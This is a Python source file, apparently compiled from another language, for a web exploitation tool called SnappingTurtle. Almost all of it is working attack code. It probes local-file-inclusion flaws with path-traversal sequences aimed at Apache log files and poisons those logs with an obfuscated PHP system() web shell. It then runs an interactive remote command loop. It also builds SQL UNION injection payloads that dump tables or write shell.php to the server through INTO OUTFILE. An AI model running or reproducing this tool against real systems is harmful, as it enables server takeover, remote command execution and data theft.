################################################################
# Compiled from Aphid to Python by Boxelder 0.5.5918.2256
# https://github.com/John-Leitch/Aphid/releases
################################################################
def var_func_0000000D(___p_op_1):
    return (___p_op_1 > 1)

def var_func_00000004(___p_op_0):
    return (___p_op_0 != "<")

def where(predicate, list):
    x = []
    for element in list:
        if predicate(element):
            (x.append)(element)
    return x

def select(selector, list):
    x = []
    for y in list:
        (x.append)(selector(y))
    return x

def selectMany(selector, list):
    x = []
    for y in list:
        for z in selector(y):
            (x.append)(z)
    return x

def flatten(list):
    def var_func_00000000(x):
        return x

    return selectMany(var_func_00000000, list)

def any(predicate, list):
    for element in list:
        if predicate(element):
            return True
    return False

def all(predicate, list):
    for x in list:
        if not predicate(x):
            return False
    return True

def first(predicate, list):
    for x in list:
        if predicate(x):
            return x

def distinct(list):
    x = []
    for y in list:
        if not (x.__contains__)(y):
            (x.append)(y)
    return x

def iter(action, list):
    for x in list:
        action(x)

count = len
def concat(list, otherList):
    x = []
    for y in otherList:
        (x.append)(y)
    for y in list:
        (x.append)(y)
    return x

def skip(count, list):
    x = []
    i = 0
    for y in list:
        if (i >= count):
            (x.append)(y)
        i = (i + 1)
    return x

def take(count, list):
    x = []
    i = 0
    for y in list:
        if (i < count):
            (x.append)(y)
        i = (i + 1)
    return x

def aggr(acc, list):
    if (len(list) == 1):
        return list[0]
    else:
        s = list[0]
        for x in skip(1, list):
            s = acc(s, x)
        return s

def join(sep, list):
    def var_func_00000001(x, y):
        return ((x + sep) + y)

    return aggr(var_func_00000001, list)

def addAll(list):
    def var_func_00000002(x, y):
        return (x + y)

    return aggr(var_func_00000002, list)

import os.path
class File():
    @staticmethod
    def appendAllText(filename, text):
        (File.writeText)(filename, text, "a")

    @staticmethod
    def writeAllText(filename, text):
        (File.writeText)(filename, text, "w")

    @staticmethod
    def writeText(filename, text, mode):
        file = open(filename, mode)
        (file.write)(text)
        (file.close)()

    @staticmethod
    def readAllText(filename):
        file = open(filename, "r")
        r = (file.read)()
        (file.close)()
        return r

    @staticmethod
    def exists(filename):
        return ((os.path).isfile)(filename)


import json
class JsonRepository():
    repo = None
    def __init__(self, filename):
        (self.filename) = filename
        if (self.exists)():
            (self.read)()
        else:
            (self.repo) = dict()

    def exists(self):
        return (File.exists)((self.filename))

    def read(self):
        (self.repo) = (json.loads)((File.readAllText)((self.filename)))
        if not isinstance((self.repo), dict):
            (self.repo) = dict()

    def write(self):
        (lambda var_00000000:(File.writeAllText)((self.filename), var_00000000))((json.dumps)((self.repo)))

    def add(self, url, obj):
        (self.repo)[url] = obj
        (self.write)()


class ExploitComponent():
    def log(self, message):
        print(message)


class Payload():
    def __init__(self, value):
        (self.value) = value

    def inject(self, target):
        return ((target % (self.value))) if ((target.__contains__)("%s")) else (target)

    def injectData(self, target):
        if (target == None):
            return None
        data = dict()
        for k in target:
            v = target[k]
            data[(self.inject)(k)] = (self.inject)(v)
        return data


class TraversalRange(ExploitComponent):
    def __init__(self, files, start, stop, dot = ".", separator = "/", terminator = ""):
        (self.files) = files
        (self.start) = start
        (self.stop) = stop
        (self.dot) = dot
        (self.separator) = separator
        (self.terminator) = terminator
        (self.file_index) = 0
        (self.i) = start

    def next(self):
        if ((self.i) < (self.stop)):
            i = (self.i)
            f = (self.file_index)
            (self.file_index) = ((self.file_index) + 1)
            if ((self.file_index) == len((self.files))):
                (self.file_index) = 0
                (self.i) = ((self.i) + 1)
            return (self.getTravSeq)(i, f)
        else:
            raise StopIteration

    def getTravSeq(self, len, file_index):
        p = (lambda var_00000001:join((self.separator), var_00000001))((self.files)[file_index])
        return ((((((self.dot) * 2) + (self.separator)) * len) + p) + (self.terminator))

    def __iter__(self):
        return self


import urllib2
class TraversalProbe(ExploitComponent):
    dirs = [["apache", "logs"], ["apache2", "logs"], ["etc", "httpd", "logs"], ["opt", "lampp", "logs"], ["usr", "local", "apache", "logs"], ["var", "log"], ["var", "log", "apache"], ["var", "log", "apache2"], ["var", "log", "httpd"], ["var", "www", "logs"], ["xampp", "apache", "logs"]]
    names = ["access.log", "access_log", "acces.log", "acces_log", "error.log", "error_log"]
    def __init__(self, value, url, data = None, dot = ".", separator = "/", terminator = "", min = 0, max = 8):
        (self.value) = value
        (self.url) = url
        (self.data) = data
        (self.dot) = dot
        (self.separator) = separator
        (self.terminator) = terminator
        (self.min) = min
        (self.max) = max
        (self.files) = (self.createPaths)()

    def createPaths(self):
        def var_func_00000003(x):
            def var_func_0000000E(y):
                return (x + [y])

            return (lambda var_00000002:select(var_func_0000000E, var_00000002))((self.names))

        return (lambda var_00000003:selectMany(var_func_00000003, var_00000003))((self.dirs))

    def seqs(self):
        return TraversalRange((self.files), (self.min), (self.max), (self.dot), (self.separator), (self.terminator))

    def scan(self):
        for x in (self.seqs)():
            r = (self.testSeq)(x)
            if (r != None):
                return r

    def testSeq(self, seq):
        pl = Payload(seq)
        url = (pl.inject)((self.url))
        (self.log)(("[?] %s" % url))
        data = (pl.injectData)((self.data))
        if (data != None):
            (self.log)(("    " + str((self.data))))
        postData = ((urllib.urlencode)(data)) if ((data != None)) else (None)
        resp = ((urllib2.urlopen)(url, postData).read)()
        t = url, data
        return (t) if ((resp.__contains__)((self.value))) else (None)


from random import shuffle, randint
class PhpShellEmitter():
    stages = [[], [], [], []]
    emitter = None
    prefix = None
    suffix = None
    padMin = 10
    padMax = 32
    junkChars = (lambda var_00000004:select(chr, var_00000004))((lambda var_00000005:where(var_func_00000004, var_00000005))(range(33, 127)))
    def __init__(self):
        (self.emitter) = PhpEmitter()

    def stageDecl(self, stage, value):
        id, assign = ((self.emitter).declStmt)(value)
        ((self.stages)[stage].append)(assign)
        return id

    def varRef(self, stage, name):
        return (self.stageDecl)(stage, ("$" + (self.stageDecl)((stage - 1), ((self.emitter).string)(name, False))))

    def emit(self, command = None):
        ((self.emitter).chr) = (self.stageDecl)(0, ((self.emitter).string)("chr", False, False))
        system = (self.stageDecl)(1, ((self.emitter).string)("system", False))
        if (command == None):
            input = (self.varRef)(2, "_GET")
            systemCallStmt = ((self.emitter).callStmt)(system, ((self.emitter).arrayAccess)(input, ((self.emitter).string)("cmd", False)))
        else:
            cmdStr = ((self.emitter).string)(command, False)
            systemCallStmt = ((self.emitter).callStmt)(system, cmdStr)
        ((self.stages)[3].append)(systemCallStmt)
        (lambda var_00000006:iter(shuffle, var_00000006))((lambda var_00000007:skip(1, var_00000007))((self.stages)))
        php = ""
        return (self.pad)(((self.emitter).doc)(addAll(flatten((self.stages)))))

    def emitJunk(self):
        def var_func_00000005(x):
            return choice((self.junkChars))

        return addAll((lambda var_00000008:select(var_func_00000005, var_00000008))(range(0, randint((self.padMin), (self.padMax)))))

    def pad(self, value):
        (self.prefix) = (self.emitJunk)()
        (self.suffix) = (self.emitJunk)()
        return (((self.prefix) + value) + (self.suffix))


from random import choice, randint
class PhpEmitter():
    varNames = []
    chr = "chr"
    min = -2147483648
    max = 2147483647
    def doc(self, body):
        return ("<?php %s ?>" % body)

    def stmt(self, exp):
        return (exp + ";")

    def declStmt(self, value):
        n = (self.nextVar)()
        return n, (self.assignStmt)(n, value)

    def assignStmt(self, var, value):
        return (self.stmt)(("{}={}".format)(var, value))

    def arrayAccess(self, array, dim):
        return ("{}[{}]".format)(array, dim)

    def callStmt(self, target, args):
        return (self.stmt)((lambda var_00000009:(self.call)(target, var_00000009))(args))

    def call(self, target, args):
        return ("{}({})".format)(target, args)

    def string(self, string, allowPassthru = True, allowChars = True):
        funcs = [(self.splitString)]
        if allowChars:
            (funcs.append)((self.chars))
        return choice(funcs)(string)

    def echo(self, value):
        return (self.stmt)(("echo %s" % value))

    def splitString(self, string):
        l = len(string)
        if (l < 2):
            return (self.string)(string)
        i = randint(1, (l - 1))
        lhs = (self.string)(string[0:i])
        rhs = (self.string)(string[i:l])
        return ((lhs + ".") + rhs)

    def chars(self, str):
        return (lambda var_0000000A:join(".", var_0000000A))((lambda var_0000000B:select((self.char), var_0000000B))(str))

    def char(self, char):
        c = ord(char)
        n = choice([c, (self.widenByte)(c)])
        return ("{}({})".format)((self.chr), (self.number)(n))

    def number(self, number):
        return choice([(self.emit), (self.addition), (self.subtraction)])(number)

    def addition(self, number):
        def var_func_00000006(x, y):
            return (x - y)

        return (self.binOp)(number, "+", var_func_00000006)

    def subtraction(self, number):
        def var_func_00000007(x, y):
            return (x + y)

        return (self.binOp)(number, "-", var_func_00000007)

    def binOp(self, number, op, func):
        while True:
            x = (self.nextInt)()
            lhs = func(number, x)
            if ((self.validNum)(x) and (self.validNum)(lhs)):
                break
        rhs = (self.number)(x)
        fmt = ("({}{} {})") if ((op == str(rhs)[:1])) else ("({}{}{})")
        return (fmt.format)(lhs, op, rhs)

    def emit(self, value):
        return value

    def nextInt(self):
        def var_func_00000008(x):
            return randint(((self.min) >> x), ((self.max) >> x))

        return choice((lambda var_0000000C:select(var_func_00000008, var_0000000C))([0, 8, 16, 32]))

    def nextVar(self):
        l = randint(1, 1)
        def var_func_00000009(x):
            return (self.getRandChar)()

        while True:
            v = ("$" + addAll((lambda var_0000000D:select(var_func_00000009, var_0000000D))(range(0, l))))
            if not ((self.varNames).__contains__)(v):
                ((self.varNames).append)(v)
                return v

    def quote(self, string):
        return ("\"%s\"" % (self.escape)(string))

    def getRandChar(self):
        return choice((self.getAllChars)())

    def getAllChars(self):
        return (((self.getChars)("a") + (self.getChars)("A")) + "_")

    def getChars(self, start):
        def var_func_0000000A(x):
            return chr((ord(start) + x))

        return addAll((lambda var_0000000E:select(var_func_0000000A, var_0000000E))(range(0, 26)))

    def escape(self, string):
        return ((string.replace)("\\", "\\\\").replace)("\"", "\\\"")

    def widenByte(self, number):
        mask = ((self.max) & ~255)
        while True:
            x = (((self.nextInt)() & mask) | number)
            if (self.validNum)(x):
                return x

    def validNum(self, number):
        return (((self.min) <= number) and (number <= (self.max)))


import urllib2
class LogInjector(ExploitComponent):
    repo = JsonRepository("logShells.json")
    def __init__(self, url, data = None, dot = ".", separator = "/", terminator = ""):
        (self.url) = url
        (self.data) = data
        (self.dot) = dot
        (self.separator) = separator
        (self.terminator) = terminator
        (self.probe) = TraversalProbe("blank command", url, data, dot, separator, terminator)
        (self.emitter) = PhpShellEmitter()

    def findShell(self):
        (self.log)("[i] Searching for shell")
        s = ((self.probe).scan)()
        if (s != None):
            (self.log)("[+] Shell found")
            if self.url in self.repo.repo:
                tags = ((self.repo).repo)[(self.url)]
                ((self.emitter).prefix) = tags[0]
                ((self.emitter).suffix) = tags[1]
            else:
                print("[-] Error: could not find shell prefix/suffix")
        else:
            (self.log)("[-] Shell not found")
        return s

    def sendShell(self):
        (self.log)("[i] Injecting shell")
        u = (((self.url) % ((self.emitter).emit)())) if (((self.url).__contains__)("%s")) else ((((self.url) + "?") + ((self.emitter).emit)()))
        ((self.repo).add)((self.url), [((self.emitter).prefix), ((self.emitter).suffix)])
        (self.log)(("    Url: " + u))
        (urllib2.urlopen)(u)

    def inject(self):
        shell = (self.findShell)()
        if (shell == None):
            (self.sendShell)()
            shell = (self.findShell)()
        return shell


import urllib
import urllib2
class LfiShell(ExploitComponent):
    shellInfo = None
    def __init__(self, url, data = None, dot = ".", separator = "/", terminator = ""):
        (self.injector) = LogInjector(url, data, dot, separator, terminator)

    def create(self):
        i = ((self.injector).inject)()
        if (i == None):
            (self.log)("[-] Could not exploit LFI")
            return False
        (self.shellInfo) = i
        return True

    def run(self, cmd):
        if ((self.shellInfo) == None):
            (self.log)("[!] No known shell")
            if not (self.create)():
                return None
            print((((self.injector).emitter).prefix))
            quit()
        u = (self.createCmdUrl)(cmd)
        (self.log)(("[?] %s" % u))
        _, d = (self.shellInfo)
        if (d != None):
            (self.log)(("    " + str(d)))
        postData = ((urllib.urlencode)(d)) if ((d != None)) else (None)
        resp = (self.parseResp)(((urllib2.urlopen)(u, postData).read)())
        return resp

    def parseResp(self, resp):
        def fan(v):
            def var_func_0000000B(x):
                return [x, (x.upper)(), (x.lower)()]

            return distinct((lambda var_0000000F:selectMany(var_func_0000000B, var_0000000F))([v, ((v.replace)("\\", "\\\\").replace)("\"", "\\\"")]))

        def split(v, t):
            for tag in fan(t):
                if (len(v) != 2):
                    v = (v[0].split)(tag)
                else:
                    break
            return v

        e = ((self.injector).emitter)
        p = split([resp], (e.prefix))
        if (len(p) < 2):
            return resp
        return split([p[1]], (e.suffix))[0]

    def createCmdUrl(self, cmd):
        u, _ = (self.shellInfo)
        d = (urllib.urlencode)({"cmd": cmd})
        x = ("&") if ((u.__contains__)("?")) else ("?")
        return ((u + x) + d)


import re
import urllib2
class SqlUnionInjector(ExploitComponent):
    def __init__(self, options, columns, dump_column, target_columns, target_table, delimiter = "'", delim = "'", row_start = "--start--", row_end = "--end--", terminator = "#"):
        (self.options) = options
        (self.columns) = columns
        (self.dump_column) = dump_column
        (self.target_columns) = target_columns
        (self.target_table) = target_table
        (self.delimiter) = delimiter
        (self.delim) = delim
        (self.row_start) = row_start
        (self.row_end) = row_end
        (self.terminator) = terminator
        (self.host) = options["HOST"]
        (self.port) = options["PORT"]
        (self.dump) = ("Dump {}".format)(target_table)
        (self.shell) = None
        (self.payload) = None
        options["PAYLOAD"] = dict(options = [(self.dump), (self.shell)], selected = (self.dump))

    def set_payload(self, payload):
        def var_func_0000000C():
            (self.payload) = payload

        return var_func_0000000C

    def is_dump(self):
        return ((self.payload) == (self.dump))

    def str(self):
        s = ""
        if (self.delimiter):
            s += (self.delimiter)
        s += "UNION SELECT "
        if (self.delim):
            empty = ((self.delim) * 2)
            delim = (self.delim)
        else:
            empty = "0"
            delim = "'"
        if (self.is_dump)():
            s += (self.union)(empty, delim)
        else:
            s += (self.shell)(empty, delim)
        return s

    def union(self, empty, delim):
        s = ((empty + ",") * (self.dump_column))
        s += ("CONCAT_WS({0},{0},{0}{1}{0},".format)(delim, (self.row_start))
        s += (",".join)((self.target_columns))
        s += (",{0}{1}{0})".format)(delim, (self.row_end))
        s += (("," + empty) * (((self.columns) - (self.dump_column)) - 1))
        s += (" FROM {}{}".format)((self.target_table), (self.terminator))
        return s

    def shell(self, empty, delim):
        shell_delim = ("\"") if ((delim == "'")) else ("'")
        shell = ("{0}<?php system($_GET[{1}cmd{1}]); ?>{0}".format)(delim, shell_delim)
        col_seq = (shell + (("," + empty) * ((self.columns) - 1)))
        directory = "htdocs/"
        traverse = ("../" * 2)
        shell_file = "shell.php"
        s = ("{0} FROM dual INTO OUTFILE {1}{2}{3}{4}{1}{5}".format)(col_seq, delim, traverse, directory, shell_file, (self.terminator))
        return s

    def finalize(self, resp):
        if (self.is_dump)():
            pattern = ("{},(.*?),{}".format)((self.row_start), (self.row_end))
            matches = (re.findall)(pattern, resp)
            return (lambda var_00000010:join("\r\n\r\n", var_00000010))(matches)
        else:
            u = ("http://{}:{}/shell.php".format)((self.host), (self.port))
            s = ("GET {}\r\n".format)(u)
            code = ((urllib2.urlopen)(u).getcode)()
            if (code == 200):
                s += ("Shell found at {}".format)(u)
            else:
                s += "Shell not found, exploit failed"
            return s


import sys
from ast import literal_eval
class CliArgs():
    Mode = None
    Post = None


class ArgMode():
    Class = 0
    Option = 1
    OptionValue = 2


class ArgOption():
    Lfi = "-lfi"
    Url = "-u"
    Post = "-p"


def parseArgs():
    i = 0
    key = None
    mode = (ArgMode.Class)
    obj = CliArgs()
    for x in (lambda var_00000011:skip(1, var_00000011))((sys.argv)):
        _cwSwitchValue_0000 = mode
        if (_cwSwitchValue_0000 == (ArgMode.Class)):
            (obj.Mode) = x
            mode = (ArgMode.Option)
        else:
            if (_cwSwitchValue_0000 == (ArgMode.Option)):
                key = x
                mode = (ArgMode.OptionValue)
            else:
                if (_cwSwitchValue_0000 == (ArgMode.OptionValue)):
                    _cwSwitchValue_0001 = key
                    if (_cwSwitchValue_0001 == (ArgOption.Url)):
                        (obj.Url) = x
                    else:
                        if (_cwSwitchValue_0001 == (ArgOption.Post)):
                            (obj.Post) = literal_eval(x)
                    mode = (ArgMode.Option)
                else:
                    print(("Error parsing argument: %s" % x))
                    quit()
        i = (i + 1)
    return obj

hasArgs = var_func_0000000D(len((sys.argv)))
args = parseArgs()
data = dict()
class ShellCommand():
    Quit = "quit"


def shellLoop(shell):
    while True:
        cmd = raw_input("st>")
        _cwSwitchValue_0002 = cmd
        if (_cwSwitchValue_0002 == (ShellCommand.Quit)):
            print("Exiting")
            quit()
        else:
            print((shell.run)(cmd))

if hasArgs:
    shell = None
    _cwSwitchValue_0003 = (args.Mode)
    if (_cwSwitchValue_0003 == (ArgOption.Lfi)):
        print("Exploiting LFI")
        shell = LfiShell((args.Url), (args.Post))
        if not (shell.create)():
            print("Failed to create shell, exiting")
            quit()
    else:
        print(("Invalid mode: %s" % (args.Mode)))
        quit()
    shellLoop(shell)
else:
    print("SnappingTurtle Web Exploitation Tool\r\n")
    print("python st.py [mode] [options]\r\n")
    print("# Modes\r\n")
    print("  -lfi               Local file inclusion\r\n")
    print("# Options\r\n")
    print("  -u {url}           Url template. Use %s to inject.")
    print("  -p {post data}     Post data is Python map format. Use %s to inject.")
    print("")
    print("# Examples\r\n")
    print("  python st.py -lfi -u http://localhost/test.php?theme=%s\r\n")
    print("  python st.py -lfi -u http://localhost/test.php?theme=%s%%00\r\n")
    print("  python st.py -lfi -u http://localhost/postTest.php -p \"{'theme':'%s'}\"\r\n")
